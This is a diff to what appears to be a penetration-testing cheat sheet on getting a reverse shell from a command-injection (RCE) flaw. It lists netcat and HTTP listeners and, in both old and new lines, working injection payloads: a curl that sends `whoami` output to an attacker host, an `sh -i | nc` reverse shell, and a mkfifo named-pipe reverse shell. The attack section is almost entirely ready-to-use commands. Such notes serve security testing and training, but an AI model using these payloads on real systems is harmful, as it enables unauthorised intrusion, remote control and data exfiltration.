@@ -7,7 +7,7 @@ Very useful on web servers if you can a vulnerability that allows RCE.
 **Step 1. Start a listener**
 This can be either a http server or using netcat.
 
-- `python -m http.server 6000`: Start a simple listener over http on port 500. Note that the server will expose anything in the root of where it started.
+- `python -m http.server 6000`: Start a simple listener over http on port 6000. Note that the server will expose anything in the root of where it started.
 - `nc -lvvp 5000`: Start a netcat based listener on port 5000
 
 ## Step 2. Deliver a payload
@@ -15,15 +15,18 @@ First use Burp Suite to capture a vulnerable POST request. Send that to the repe
 
 Example paylods:
 ```
+# Set the host_ip (attacking machine)
+host_ip='x.x.x.x'
+
 # Use curl to find and output the current user as a query paramter.
 # Use to ascertain context web server is run as.
-";curl http://[host_ip]:5000?output=`whoami`;"
+payload=";curl http://$host_ip:5000?output=`whoami`;"
 
 # Create a simple interactive shell and pipe the output to netcat
-";sh -i 2>&1|nc [host_ip] 5000;"
+payload=";sh -i 2>&1|nc host_ip 5000;"
 
 # Advanced shell using a named pipe to capture the output and forward that to netcat
-";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [host_ip] 5000 >/tmp/f;"
+payload=";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $host_ip 5000 >/tmp/f;"
 ```
 
 ## Step 3. Spawn a bash shell
